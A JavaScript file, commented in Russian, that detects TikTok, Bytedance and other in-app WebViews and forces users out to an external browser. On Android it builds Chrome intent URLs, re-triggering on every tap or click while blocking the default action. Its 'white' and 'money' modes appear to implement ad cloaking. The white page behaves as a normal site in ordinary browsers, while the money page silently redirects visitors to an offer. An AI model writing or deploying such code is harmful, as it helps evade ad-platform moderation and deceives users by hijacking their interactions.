(function (win, doc) {
  'use strict';

  if (win.__mainIntentInitialized) {
    return;
  }
  win.__mainIntentInitialized = true;

  var defaultCfg = {
    page: 'white',
    intentTarget: '',
    cleanTarget: '',
    autoAttemptOnLoad: false,
    repeatEveryMs: 0,
    repeatMaxMs: 0,
    userActionEvents: ['pointerdown', 'touchstart', 'click'],
    debug: false
  };

  var userCfg = win.IntentBypassConfig || {};
  var cfg = Object.assign({}, defaultCfg, userCfg);

  function log() {
    if (!cfg.debug || !win.console || !console.log) return;
    var args = Array.prototype.slice.call(arguments);
    args.unshift('[main.js]');
    console.log.apply(console, args);
  }

  var currentUrl = win.location.href;
  var intentTarget = cfg.intentTarget || currentUrl;

  var cleanTarget;
  if (cfg.page === 'money') {
    cleanTarget = cfg.cleanTarget || cfg.intentTarget || currentUrl;
  } else {
    cleanTarget = cfg.cleanTarget || intentTarget || currentUrl;
  }

  function detectEnv() {
    var ua = (win.navigator && win.navigator.userAgent) || '';

    var isAndroid = /Android/i.test(ua);
    var isIOS = /(iPhone|iPad|iPod|iOS)/i.test(ua);

    var isTikTok = /tiktok|musical_ly/i.test(ua);
    var isBytedance = /bytedance|aweme|lark/i.test(ua);
    var hasWV = /\bwv\)/i.test(ua);

    var isGenericWebView =
      hasWV ||
      /\bVersion\/[\d.]+.*Safari\/[\d.]+$/i.test(ua);

    var isTTWebView =
      /ttwebview/i.test(ua) || isTikTok || isBytedance;

    var isWebView = isGenericWebView || isTTWebView;

    return {
      ua: ua,
      isAndroid: isAndroid,
      isIOS: isIOS,
      isWebView: isWebView
    };
  }

  var env = detectEnv();
  log('env', env, 'cfg', cfg, 'intentTarget', intentTarget, 'cleanTarget', cleanTarget);

  function navigate(url) {
    if (!url) return;
    log('navigate to', url);
    try {
      win.location.href = url;
    } catch (e) {
      try {
        win.location.assign(url);
      } catch (e2) {
        log('navigation failed', e2);
      }
    }
  }

  function buildChromeIntent(httpUrl, fallbackUrl) {
    if (!httpUrl) return null;
    var u;
    try {
      u = new URL(httpUrl, win.location.href);
    } catch (e) {
      return null;
    }

    var path = (u.pathname || '/');
    var query = u.search || '';
    var hash = u.hash || '';
    var base = u.host + path + query + hash;
    var scheme = (u.protocol || 'https:').replace(':', '');
    var fb = fallbackUrl || httpUrl;

    return 'intent://' + base +
      '#Intent;' +
      'scheme=' + scheme + ';' +
      'S.browser_fallback_url=' + encodeURIComponent(fb) + ';' +
      'end;';
  }

  function openExternalFromWebView(reason) {
    log('openExternalFromWebView, reason:', reason, 'env.isWebView=', env.isWebView);
    if (!env.isWebView) {
      return;
    }

    var target = intentTarget || currentUrl;

    if (env.isAndroid) {
      var intentUrl = buildChromeIntent(target, target);
      if (!intentUrl) {
        navigate(target);
        return;
      }
      navigate(intentUrl);
      return;
    }

    if (env.isIOS) {
      navigate(target);
      return;
    }

    navigate(target);
  }

  // Флаг нужен ТОЛЬКО для обычного браузера на money-странице,
  // чтобы не делать много редиректов подряд.
  var browserRedirectedOnce = false;

  function onUserAction(ev) {
    // В WebView — каждый тап/свайп/клик снова дергает интент
    if (env.isWebView) {
      if (ev && ev.preventDefault) ev.preventDefault();
      openExternalFromWebView('user-action');
      return;
    }

    // В обычном браузере:
    //   white: вообще ничего не делаем
    //   money: однократный редирект на оффер
    if (cfg.page === 'money' && cleanTarget && !browserRedirectedOnce) {
      browserRedirectedOnce = true;
      if (ev && ev.preventDefault) ev.preventDefault();
      navigate(cleanTarget);
    }
  }

  // ===== INIT =====

  if (!env.isWebView) {
    log('Not a WebView');

    if (cfg.page === 'money' && cleanTarget) {
      navigate(cleanTarget);
    }
    // white в нормальном браузере — живет как обычный сайт
    return;
  }

  log('In WebView, attaching userAction listeners...');
  var events = Array.isArray(cfg.userActionEvents) && cfg.userActionEvents.length
    ? cfg.userActionEvents
    : ['pointerdown', 'touchstart', 'click'];

  events.forEach(function (evtName) {
    doc.addEventListener(evtName, onUserAction, { passive: false });
  });

  if (cfg.autoAttemptOnLoad) {
    openExternalFromWebView('auto-load');
  }

})(window, document);
